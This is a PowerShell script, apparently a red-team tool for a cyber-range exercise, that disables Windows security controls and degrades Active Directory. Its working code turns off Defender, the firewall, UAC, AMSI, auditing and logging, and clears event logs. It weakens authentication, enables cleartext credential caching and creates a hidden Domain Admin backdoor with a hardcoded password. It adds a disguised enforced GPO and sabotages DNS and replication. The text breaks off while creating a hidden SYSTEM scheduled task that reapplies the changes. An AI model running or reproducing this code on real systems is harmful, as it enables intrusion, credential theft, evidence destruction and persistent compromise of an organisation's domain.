#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Red Team AD & Windows Security Neutralization Script
.DESCRIPTION
    Disables Windows Server security controls and destabilizes Active Directory.
    Reversible via -Mode Remove. Skips protected accounts.
    Every step is wrapped in error handling — failures are reported with reasons
    but never stop execution of remaining steps.
.PARAMETER Mode
    install  — Deploy all payloads
    remove   — Reverse all changes (requires backup files created during install)
    status   — Show current state of each attack vector
.EXAMPLE
    .\nuke-ad.ps1 -Mode install
    .\nuke-ad.ps1 -Mode remove
#>

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("install","remove","status")]
    [string]$Mode
)

# Force script to never terminate early — every step runs regardless of prior failures
$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

# ── CONFIGURATION ──────────────────────────────────────────────────
$ProtectedUsers  = @("cyberrange","ansible","scoring","GREYTEAM","krbtgt","Guest")
$BackupDir       = "$env:SystemRoot\Temp\.syshealth"
$Marker          = "$BackupDir\.deployed"
$MagicPass       = ConvertTo-SecureString "rt2025!delta" -AsPlainText -Force

# ── RESULT TRACKING ────────────────────────────────────────────────
$script:Results = [System.Collections.ArrayList]::new()

function Write-Status($msg)  { Write-Host "[+] " -ForegroundColor Green -NoNewline; Write-Host $msg }
function Write-Warn($msg)    { Write-Host "[!] " -ForegroundColor Yellow -NoNewline; Write-Host $msg }
function Write-Fail($msg)    { Write-Host "[-] " -ForegroundColor Red -NoNewline; Write-Host $msg }
function Write-Header($msg)  { Write-Host "`n── $msg ──" -ForegroundColor Cyan }

function Record-Result {
    param([string]$Step, [string]$Status, [string]$Detail)
    $script:Results.Add([PSCustomObject]@{
        Step   = $Step
        Status = $Status
        Detail = $Detail
    }) | Out-Null
    switch ($Status) {
        "OK"      { Write-Status "$Step — $Detail" }
        "PARTIAL" { Write-Warn   "$Step — $Detail" }
        "FAIL"    { Write-Fail   "$Step — $Detail" }
        "SKIP"    { Write-Warn   "$Step — SKIPPED: $Detail" }
    }
}

# Runs a scriptblock, records result, NEVER throws
function Invoke-Step {
    param(
        [string]$Name,
        [scriptblock]$Action,
        [string]$SuccessMsg = "Done"
    )
    try {
        $result = & $Action
        if ($result -is [string] -and $result -ne "") {
            Record-Result $Name "OK" $result
        } else {
            Record-Result $Name "OK" $SuccessMsg
        }
    } catch {
        Record-Result $Name "FAIL" "$($_.Exception.Message)"
    }
}

function Is-Protected($sam) {
    return ($ProtectedUsers -contains $sam)
}

function Ensure-BackupDir {
    if (-not (Test-Path $BackupDir)) {
        New-Item -ItemType Directory -Path $BackupDir -Force | Out-Null
        attrib +h +s $BackupDir
    }
}

function Show-Receipt {
    Write-Header "EXECUTION RECEIPT"
    $ok   = ($script:Results | Where-Object Status -eq "OK").Count
    $part = ($script:Results | Where-Object Status -eq "PARTIAL").Count
    $fail = ($script:Results | Where-Object Status -eq "FAIL").Count
    $skip = ($script:Results | Where-Object Status -eq "SKIP").Count
    $total = $script:Results.Count

    Write-Host ""
    Write-Host "  Total steps: $total" -ForegroundColor White
    Write-Host "  Succeeded:   $ok" -ForegroundColor Green
    if ($part -gt 0) { Write-Host "  Partial:     $part" -ForegroundColor Yellow }
    if ($skip -gt 0) { Write-Host "  Skipped:     $skip" -ForegroundColor Yellow }
    if ($fail -gt 0) { Write-Host "  Failed:      $fail" -ForegroundColor Red }
    Write-Host ""

    if ($fail -gt 0) {
        Write-Header "FAILED STEPS (review these)"
        foreach ($r in ($script:Results | Where-Object Status -eq "FAIL")) {
            Write-Fail "$($r.Step): $($r.Detail)"
        }
        Write-Host ""
    }
}

# ══════════════════════════════════════════════════════════════════════
#  PHASE 1: WINDOWS SECURITY CONTROLS
# ══════════════════════════════════════════════════════════════════════

function Disable-WindowsSecurity {
    Write-Header "PHASE 1: Windows Security Controls"

    # ── 1a. Windows Firewall ──
    Invoke-Step "1a-Firewall" {
        netsh advfirewall export "$BackupDir\firewall-backup.wfw" 2>$null | Out-Null
        $fwErr = @()
        try { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop }
        catch { $fwErr += "Set-NetFirewallProfile failed: $_" }

        # GPO-level disable as fallback/reinforcement
        $regPaths = @(
            "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile",
            "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile",
            "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile"
        )
        foreach ($p in $regPaths) {
            $out = reg add $p /v EnableFirewall /t REG_DWORD /d 0 /f 2>&1
            if ($LASTEXITCODE -ne 0) { $fwErr += "reg add $p failed: $out" }
        }
        if ($fwErr.Count -gt 0 -and $fwErr.Count -lt 4) { return "Partial — some methods worked: $($fwErr -join '; ')" }
        elseif ($fwErr.Count -ge 4) { throw "All firewall disable methods failed: $($fwErr -join '; ')" }
        return "Firewall disabled (cmdlet + GPO registry keys)"
    }

    # ── 1b. Windows Defender ──
    Invoke-Step "1b-Defender" {
        try { Get-MpPreference | Export-Clixml "$BackupDir\defender-prefs.xml" -ErrorAction Stop } catch {}
        $defErr = @()

        # Try cmdlet approach
        $defPrefs = @{
            DisableRealtimeMonitoring = $true
            DisableBehaviorMonitoring = $true
            DisableBlockAtFirstSeen   = $true
            DisableIOAVProtection     = $true
            DisableScriptScanning     = $true
        }
        foreach ($kv in $defPrefs.GetEnumerator()) {
            try { Set-MpPreference @{$kv.Key = $kv.Value} -ErrorAction Stop }
            catch { $defErr += "$($kv.Key): $($_.Exception.Message)" }
        }
        try { Set-MpPreference -MAPSReporting Disabled -ErrorAction Stop } catch { $defErr += "MAPSReporting: $_" }
        try { Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction Stop } catch { $defErr += "SubmitSamples: $_" }

        # Registry-level disable as fallback (survives tamper protection in some configs)
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null | Out-Null
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null | Out-Null
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 2>$null | Out-Null
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 2>$null | Out-Null

        # Try stopping the service directly
        try { Stop-Service -Name WinDefend -Force -ErrorAction Stop } catch { $defErr += "Stop-Service WinDefend: $_" }
        try { Set-Service -Name WinDefend -StartupType Disabled -ErrorAction Stop } catch { $defErr += "Disable WinDefend service: $_" }

        if ($defErr.Count -eq 0) { return "Defender fully disabled (cmdlet + registry + service)" }
        elseif ($defErr.Count -lt 5) { return "Defender partially disabled — registry keys set as fallback. Cmdlet failures: $($defErr.Count) ($($defErr[0])...)" }
        else { return "Defender cmdlets mostly blocked (tamper protection likely on) — registry policy keys set as fallback. Failures: $($defErr -join '; ')" }
    } -SuccessMsg "Defender disabled"

    # ── 1c. UAC ──
    Invoke-Step "1c-UAC" {
        $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        try { Get-ItemProperty $uacKey -ErrorAction Stop | Export-Clixml "$BackupDir\uac-backup.xml" } catch {}
        $uacErr = @()
        try { Set-ItemProperty $uacKey -Name EnableLUA -Value 0 -ErrorAction Stop } catch { $uacErr += "EnableLUA: $_" }
        try { Set-ItemProperty $uacKey -Name ConsentPromptBehaviorAdmin -Value 0 -ErrorAction Stop } catch { $uacErr += "ConsentPrompt: $_" }
        try { Set-ItemProperty $uacKey -Name PromptOnSecureDesktop -Value 0 -ErrorAction Stop } catch { $uacErr += "SecureDesktop: $_" }
        if ($uacErr.Count -gt 0) { throw "UAC partially failed: $($uacErr -join '; ')" }
        return "UAC disabled (requires reboot for full effect)"
    }

    # ── 1d. Audit Policies ──
    Invoke-Step "1d-AuditPolicy" {
        $backupOut = auditpol /backup /file:"$BackupDir\audit-backup.csv" 2>&1
        $clearOut = auditpol /clear /y 2>&1
        if ($LASTEXITCODE -ne 0) { throw "auditpol /clear failed (exit $LASTEXITCODE): $clearOut" }
        return "All audit policies cleared"
    }

    # ── 1e. Event Logs ──
    Invoke-Step "1e-EventLogs" {
        $criticalLogs = @("Security","System","Application","Microsoft-Windows-PowerShell/Operational",
                          "Microsoft-Windows-Sysmon/Operational","Windows PowerShell",
                          "Microsoft-Windows-Windows Defender/Operational")
        $logErr = @()
        foreach ($log in $criticalLogs) {
            $disableOut = wevtutil sl $log /ms:1048576 /e:false 2>&1
            if ($LASTEXITCODE -ne 0) { $logErr += "${log}(disable): $disableOut" }
            $clearOut = wevtutil cl $log 2>&1
            if ($LASTEXITCODE -ne 0) { $logErr += "${log}(clear): $clearOut" }
        }
        $succeeded = $criticalLogs.Count - ($logErr | ForEach-Object { ($_ -split '\(')[0] } | Select-Object -Unique).Count
        if ($logErr.Count -eq 0) { return "All $($criticalLogs.Count) event logs disabled and cleared" }
        elseif ($succeeded -gt 0) { return "Disabled $succeeded/$($criticalLogs.Count) logs. Failures: $($logErr -join '; ')" }
        else { throw "All event log operations failed: $($logErr -join '; ')" }
    }

    # ── 1f. AMSI ──
    Invoke-Step "1f-AMSI" {
        $r1 = reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers" /f 2>&1
        $r2 = reg add "HKLM\SOFTWARE\Microsoft\AMSI" /v AmsiEnable /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { throw "AMSI registry write failed: $r2" }
        return "AMSI disabled via registry"
    }

    # ── 1g. PowerShell Logging ──
    Invoke-Step "1g-PSLogging" {
        $psLogKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        $psErr = @()
        foreach ($sub in @("ScriptBlockLogging","ModuleLogging","Transcription")) {
            try {
                New-Item -Path "$psLogKey\$sub" -Force -ErrorAction Stop | Out-Null
                $valName = switch ($sub) {
                    "ScriptBlockLogging" { "EnableScriptBlockLogging" }
                    "ModuleLogging"      { "EnableModuleLogging" }
                    "Transcription"      { "EnableTranscripting" }
                }
                Set-ItemProperty "$psLogKey\$sub" -Name $valName -Value 0 -ErrorAction Stop
            } catch {
                $psErr += "${sub}: $($_.Exception.Message)"
            }
        }
        if ($psErr.Count -gt 0) { throw "Some PS logging keys failed: $($psErr -join '; ')" }
        return "Script block, module, and transcription logging disabled"
    }

    # ── 1h. LSA Protection ──
    Invoke-Step "1h-LSAProtection" {
        reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>$null | Out-File "$BackupDir\lsa-backup.txt"
        $out = reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { throw "Registry write failed: $out — LSA may be UEFI-locked (Credential Guard with UEFI lock prevents this)" }
        return "RunAsPPL set to 0 (requires reboot; if UEFI-locked, will not take effect until Credential Guard is removed)"
    }

    # ── 1i. Credential Guard ──
    Invoke-Step "1i-CredGuard" {
        $cgErr = @()
        $r1 = reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { $cgErr += "VBS disable: $r1" }
        $r2 = reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { $cgErr += "LsaCfgFlags: $r2" }

        # Also try disabling via WMI (more thorough)
        try {
            $r3 = reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v RequirePlatformSecurityFeatures /t REG_DWORD /d 0 /f 2>&1
        } catch { $cgErr += "PlatformSecurity: $_" }

        if ($cgErr.Count -gt 0) { throw "Credential Guard disable partial: $($cgErr -join '; ') — may require UEFI variable deletion + reboot (bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions DISABLE-LSA-ISO)" }
        return "Credential Guard registry keys cleared (full disable requires reboot; UEFI lock may prevent it)"
    }

    # ── 1j. NTLMv2 / SMB Signing ──
    Invoke-Step "1j-AuthWeaken" {
        $authErr = @()
        $regs = @(
            @("HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "LmCompatibilityLevel", 0),
            @("HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters", "RequireSecuritySignature", 0),
            @("HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters", "EnableSecuritySignature", 0),
            @("HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters", "RequireSecuritySignature", 0)
        )
        foreach ($r in $regs) {
            $out = reg add $r[0] /v $r[1] /t REG_DWORD /d $r[2] /f 2>&1
            if ($LASTEXITCODE -ne 0) { $authErr += "$($r[1]): $out" }
        }
        if ($authErr.Count -gt 0) { throw "Auth weakening partial: $($authErr -join '; ')" }
        return "LM/NTLM downgraded, SMB signing disabled (relay attacks now possible)"
    }

    # ── 1k. WDigest ──
    Invoke-Step "1k-WDigest" {
        $out = reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f 2>&1
        if ($LASTEXITCODE -ne 0) { throw "WDigest registry write failed: $out" }
        return "WDigest plaintext credential caching enabled (next logon stores cleartext in LSASS)"
    }
}

# ══════════════════════════════════════════════════════════════════════
#  PHASE 2: ACTIVE DIRECTORY DESTABILIZATION
# ══════════════════════════════════════════════════════════════════════

function Destroy-AD {
    Write-Header "PHASE 2: Active Directory Destabilization"

    # Pre-check: can we even talk to AD?
    $adAvailable = $false
    Invoke-Step "2-Preflight" {
        Import-Module ActiveDirectory -ErrorAction Stop
        $null = Get-ADDomain -ErrorAction Stop
        $script:adAvailable = $true
        return "AD module loaded, domain reachable"
    }

    # Even if AD module fails, continue with registry-only attacks
    if (-not $script:adAvailable) {
        Record-Result "2-Preflight-Fallback" "WARN" "AD module unavailable — skipping AD-specific steps, continuing with registry/local attacks"
    }

    # ── 2a. Domain Password Policy ──
    Invoke-Step "2a-PasswordPolicy" {
        if (-not $script:adAvailable) { throw "AD module not available — cannot modify domain password policy (requires RSAT AD tools: Install-WindowsFeature RSAT-AD-PowerShell)" }
        Get-ADDefaultDomainPasswordPolicy | Export-Clixml "$BackupDir\password-policy.xml"
        Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain) `
            -MinPasswordLength 0 `
            -PasswordHistoryCount 0 `
            -ComplexityEnabled $false `
            -MinPasswordAge "0.00:00:00" `
            -MaxPasswordAge "0.00:00:00" `
            -LockoutThreshold 0 `
            -LockoutDuration "0.00:00:00" `
            -LockoutObservationWindow "0.00:00:00" `
            -ReversibleEncryptionEnabled $true `
            -ErrorAction Stop
        return "Password policy gutted (no length/complexity/lockout, reversible encryption on)"
    }

    # ── 2b. Kerberos Pre-Auth ──
    Invoke-Step "2b-KerberosPreAuth" {
        if (-not $script:adAvailable) { throw "AD module not available — cannot modify user Kerberos settings" }
        $allUsers = Get-ADUser -Filter * -Properties DoesNotRequirePreAuth,SamAccountName -ErrorAction Stop
        $allUsers | Export-Clixml "$BackupDir\user-preauth-backup.xml"
        $modified = 0; $failed = 0; $skipped = 0
        foreach ($user in $allUsers) {
            if (Is-Protected $user.SamAccountName) { $skipped++; continue }
            try {
                Set-ADAccountControl $user -DoesNotRequirePreAuth $true -ErrorAction Stop
                $modified++
            } catch { $failed++ }
        }
        if ($failed -gt 0 -and $modified -gt 0) { return "Pre-auth disabled on $modified users, $failed failed (likely protected/system accounts), $skipped skipped (whitelist)" }
        elseif ($failed -gt 0 -and $modified -eq 0) { throw "All $failed user modifications failed — insufficient permissions or accounts are protected" }
        return "Kerberos pre-auth disabled on $modified users (AS-REP Roastable), $skipped whitelisted"
    }

    # ── 2c. LDAP Signing ──
    Invoke-Step "2c-LDAPSigning" {
        reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity 2>$null | Out-File "$BackupDir\ldap-signing.txt"
        $errs = @()
        $r1 = reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { $errs += "LDAPServerIntegrity: $r1" }
        $r2 = reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { $errs += "ChannelBinding: $r2" }
        $r3 = reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "Global Catalog SSL Port" /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { $errs += "GC SSL: $r3" }
        if ($errs.Count -gt 0) { throw "LDAP weakening partial ($($errs.Count) failed): $($errs -join '; ') — NTDS registry may be ACL-locked" }
        return "LDAP signing disabled, channel binding disabled, GC SSL port zeroed"
    }

    # ── 2d. Reversible Encryption ──
    Invoke-Step "2d-ReversibleEnc" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        $allUsers = Get-ADUser -Filter * -Properties SamAccountName -ErrorAction Stop
        $modified = 0; $failed = 0
        foreach ($user in $allUsers) {
            if (Is-Protected $user.SamAccountName) { continue }
            try {
                Set-ADUser $user -AllowReversiblePasswordEncryption $true -ErrorAction Stop
                $modified++
            } catch { $failed++ }
        }
        if ($failed -gt 0) { return "Reversible encryption enabled on $modified users, $failed failed (protected/system accounts)" }
        return "Reversible password encryption enabled on $modified users"
    }

    # ── 2e. Kerberos Encryption Downgrade ──
    Invoke-Step "2e-KerbEncryption" {
        $out = reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" /v SupportedEncryptionTypes /t REG_DWORD /d 4 /f 2>&1
        if ($LASTEXITCODE -ne 0) { throw "Registry write failed: $out — Kerberos policy may be GPO-controlled (check GPMC for conflicting policies)" }
        return "Kerberos forced to RC4 only (AES disabled, tickets crackable offline)"
    }

    # ── 2f. AdminSDHolder Backdoor ──
    Invoke-Step "2f-AdminSDHolder" {
        if (-not $script:adAvailable) { throw "AD module not available — cannot backdoor AdminSDHolder" }
        $domainDN = (Get-ADDomain -ErrorAction Stop).DistinguishedName
        $adminSDHolder = "AD:CN=AdminSDHolder,CN=System,$domainDN"

        $acl = Get-Acl $adminSDHolder -ErrorAction Stop
        $acl | Export-Clixml "$BackupDir\adminsdholder-acl.xml"

        $rogueUser = "svc-health-check"
        $created = $false
        if (-not (Get-ADUser -Filter "SamAccountName -eq '$rogueUser'" -ErrorAction SilentlyContinue)) {
            try {
                New-ADUser -Name $rogueUser -SamAccountName $rogueUser -AccountPassword $MagicPass `
                    -Enabled $true -PasswordNeverExpires $true -Description "System Health Monitoring" `
                    -Path "CN=Users,$domainDN" -ErrorAction Stop
                $created = $true
            } catch {
                throw "Failed to create $rogueUser account: $($_.Exception.Message) — likely insufficient privileges (need Domain Admin or Account Operator)"
            }
        }

        try { Add-ADGroupMember -Identity "Domain Admins" -Members $rogueUser -ErrorAction Stop }
        catch { Record-Result "2f-AdminSDHolder-DA" "PARTIAL" "User exists but DA add failed: $_" }

        try {
            $rogueUserSID = (Get-ADUser $rogueUser -ErrorAction Stop).SID
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $rogueUserSID,
                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                [System.Security.AccessControl.AccessControlType]::Allow
            )
            $acl.AddAccessRule($ace)
            Set-Acl $adminSDHolder $acl -ErrorAction Stop
        } catch {
            throw "ACL modification failed: $($_.Exception.Message) — need Domain Admin rights on AdminSDHolder object"
        }

        $msg = "AdminSDHolder backdoored with $rogueUser (GenericAll)"
        if ($created) { $msg += " — account created with password rt2025!delta" }
        $msg += " — SDProp will re-propagate every 60 min"
        return $msg
    }

    # ── 2g. Tombstone Lifetime ──
    Invoke-Step "2g-Tombstone" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        $configDN = (Get-ADRootDSE -ErrorAction Stop).configurationNamingContext
        $dirServDN = "CN=Directory Service,CN=Windows NT,CN=Services,$configDN"
        Get-ADObject $dirServDN -Properties tombstoneLifetime -ErrorAction Stop | Export-Clixml "$BackupDir\tombstone-backup.xml"
        try {
            Set-ADObject $dirServDN -Replace @{tombstoneLifetime=2} -ErrorAction Stop
        } catch {
            throw "Tombstone write failed: $($_.Exception.Message) — need Enterprise Admin or Schema Admin for configuration partition writes"
        }
        return "Tombstone lifetime reduced to 2 days (default 180) — deleted objects become unrecoverable quickly"
    }

    # ── 2h. Replication Sabotage ──
    Invoke-Step "2h-Replication" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        $siteLinksDN = "CN=IP,CN=Inter-Site Transports,CN=Sites," + (Get-ADRootDSE).configurationNamingContext
        $siteLinks = Get-ADObject -SearchBase $siteLinksDN -Filter 'ObjectClass -eq "siteLink"' -Properties replInterval,cost -ErrorAction Stop
        if ($siteLinks.Count -eq 0) { throw "No site links found — single-site topology (replication sabotage not applicable)" }
        $siteLinks | Export-Clixml "$BackupDir\sitelinks-backup.xml"
        $modified = 0; $failed = 0
        foreach ($link in $siteLinks) {
            try {
                Set-ADObject $link -Replace @{replInterval=10080; cost=99999} -ErrorAction Stop
                $modified++
            } catch { $failed++ }
        }
        if ($failed -gt 0) { return "Modified $modified/$($siteLinks.Count) site links (repl=7days, cost=99999). $failed failed — may need Enterprise Admin for config partition" }
        return "All $modified site links set to 7-day replication interval, cost 99999"
    }

    # ── 2i. OU Protection ──
    Invoke-Step "2i-OUProtection" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        $ous = Get-ADOrganizationalUnit -Filter * -Properties ProtectedFromAccidentalDeletion -ErrorAction Stop
        if ($ous.Count -eq 0) { throw "No OUs found — flat OU structure" }
        $ous | Export-Clixml "$BackupDir\ou-protection-backup.xml"
        $modified = 0; $failed = 0
        foreach ($ou in $ous) {
            try {
                Set-ADOrganizationalUnit $ou -ProtectedFromAccidentalDeletion $false -ErrorAction Stop
                $modified++
            } catch { $failed++ }
        }
        if ($failed -gt 0) { return "Removed protection from $modified/$($ous.Count) OUs. $failed failed — may have explicit deny ACEs" }
        return "Deletion protection removed from all $modified OUs"
    }

    # ── 2j. Rogue GPO ──
    Invoke-Step "2j-RogueGPO" {
        $gpoName = "Windows Update Health Policy"
        try { $null = Get-Command Get-GPO -ErrorAction Stop } catch {
            throw "GroupPolicy module not available — install RSAT: Install-WindowsFeature GPMC"
        }
        $existingGpo = Get-GPO -Name $gpoName -ErrorAction SilentlyContinue
        if ($existingGpo) { return "GPO '$gpoName' already exists (GUID: $($existingGpo.Id))" }

        $gpo = New-GPO -Name $gpoName -ErrorAction Stop
        $domainDN = (Get-ADDomain).DistinguishedName
        try {
            New-GPLink -Guid $gpo.Id -Target $domainDN -LinkEnabled Yes -Enforced Yes -ErrorAction Stop | Out-Null
        } catch {
            # GPO created but link failed
            Record-Result "2j-RogueGPO-Link" "PARTIAL" "GPO created but link to domain root failed: $_ — try linking manually in GPMC"
        }

        $gpoSettings = @(
            @("HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile", "EnableFirewall", 0),
            @("HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile", "EnableFirewall", 0),
            @("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            @("HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging", "EnableScriptBlockLogging", 0),
            @("HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "LmCompatibilityLevel", 0),
            @("HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest", "UseLogonCredential", 1)
        )
        $gpoErr = @()
        foreach ($s in $gpoSettings) {
            try {
                Set-GPRegistryValue -Guid $gpo.Id -Key $s[0] -ValueName $s[1] -Type DWord -Value $s[2] -ErrorAction Stop | Out-Null
            } catch { $gpoErr += "$($s[1]): $_" }
        }
        $gpo.Id | Out-File "$BackupDir\rogue-gpo-id.txt"
        if ($gpoErr.Count -gt 0) { return "GPO created and linked (enforced). $($gpoErr.Count) settings failed: $($gpoErr[0])..." }
        return "GPO '$gpoName' created, enforced at domain root — re-applies weakened settings every gpupdate cycle"
    }

    # ── 2k. DNS Forwarders ──
    Invoke-Step "2k-DNSForwarders" {
        try { $null = Get-Command Get-DnsServerForwarder -ErrorAction Stop } catch {
            throw "DnsServer module not available — this may not be a DNS server, or install RSAT: Install-WindowsFeature RSAT-DNS-Server"
        }
        Get-DnsServerForwarder | Export-Clixml "$BackupDir\dns-forwarders.xml"
        Get-DnsServerForwarder | ForEach-Object {
            foreach ($ip in $_.IPAddress) {
                Remove-DnsServerForwarder -IPAddress $ip -Force -ErrorAction SilentlyContinue
            }
        }
        $addErr = @()
        try { Add-DnsServerForwarder -IPAddress "127.0.0.1" -ErrorAction Stop } catch { $addErr += "127.0.0.1: $_" }
        try { Add-DnsServerForwarder -IPAddress "0.0.0.0" -ErrorAction Stop } catch { $addErr += "0.0.0.0: $_" }
        if ($addErr.Count -gt 0) { return "Forwarders cleared but dead replacements failed to add: $($addErr -join '; ')" }
        return "DNS forwarders replaced with 127.0.0.1 + 0.0.0.0 (external resolution dead)"
    }

    # ── 2l. DNS Scavenging ──
    Invoke-Step "2l-DNSScavenging" {
        try { $null = Get-Command Get-DnsServerScavenging -ErrorAction Stop } catch {
            throw "DnsServer module not available"
        }
        Get-DnsServerScavenging | Export-Clixml "$BackupDir\dns-scavenging.xml"
        Set-DnsServerScavenging -ScavengingState $false -ErrorAction Stop
        return "DNS scavenging disabled (stale records persist)"
    }

    # ── 2m. NTDS / Anonymous LDAP ──
    Invoke-Step "2m-NTDS" {
        $ntdsErr = @()
        $r1 = reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "Strict Replication Consistency" /t REG_DWORD /d 0 /f 2>&1
        if ($LASTEXITCODE -ne 0) { $ntdsErr += "StrictReplConsistency: $r1" }

        try {
            $dse = [ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$((Get-ADRootDSE).configurationNamingContext)"
            $dse.Properties["dsHeuristics"].Value = "0000002"
            $dse.CommitChanges()
        } catch {
            $ntdsErr += "dsHeuristics: $($_.Exception.Message) — need Enterprise Admin for configuration partition ADSI writes"
        }
        if ($ntdsErr.Count -gt 0 -and $ntdsErr.Count -lt 2) { return "Partial: $($ntdsErr -join '; ')" }
        elseif ($ntdsErr.Count -ge 2) { throw "Both NTDS modifications failed: $($ntdsErr -join '; ')" }
        return "Strict replication consistency disabled, anonymous LDAP bind enabled"
    }

    # ── 2n. LLMNR ──
    Invoke-Step "2n-LLMNR" {
        $out = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 1 /f 2>&1
        if ($LASTEXITCODE -ne 0) { throw "Registry write failed: $out" }
        return "LLMNR re-enabled (Responder/Inveigh poisoning now possible)"
    }

    # ── 2o. Kerberoasting SPNs ──
    Invoke-Step "2o-Kerberoasting" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        $targetUsers = Get-ADUser -Filter * -Properties ServicePrincipalNames,SamAccountName -ErrorAction Stop | Where-Object {
            -not (Is-Protected $_.SamAccountName) -and $_.Enabled -eq $true -and $_.ServicePrincipalNames.Count -eq 0
        }
        if ($targetUsers.Count -eq 0) { return "No eligible users found (all already have SPNs or are protected)" }
        $targetUsers | Export-Clixml "$BackupDir\spn-targets.xml"
        $modified = 0; $failed = 0; $failReasons = @()
        foreach ($user in $targetUsers | Select-Object -First 20) {
            try {
                $fakeSPN = "HTTP/$($user.SamAccountName).internal.svc"
                Set-ADUser $user -ServicePrincipalNames @{Add=$fakeSPN} -ErrorAction Stop
                $modified++
            } catch {
                $failed++
                if ($failReasons.Count -lt 3) { $failReasons += "$($user.SamAccountName): $($_.Exception.Message)" }
            }
        }
        if ($failed -gt 0) { return "Added SPNs to $modified users, $failed failed. First failures: $($failReasons -join '; ')" }
        return "Fake SPNs added to $modified accounts (now Kerberoastable)"
    }

    # ── 2p. Scheduled Task ──
    Invoke-Step "2p-SchedTask" {
        $taskScript = @"
`$ErrorActionPreference = 'Continue'
try { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled `$false } catch {}
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>`$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f 2>`$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f 2>`$null
auditpol /clear /y 2>`$null
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f 2>`$null
"@
        $taskScript | Out-File "$BackupDir\reapply.ps1" -Encoding UTF8

        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$BackupDir\reapply.ps1`"" -ErrorAction Stop
            $trigger1 = New-ScheduledTaskTrigger -AtStartup
            $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -ErrorAction Stop
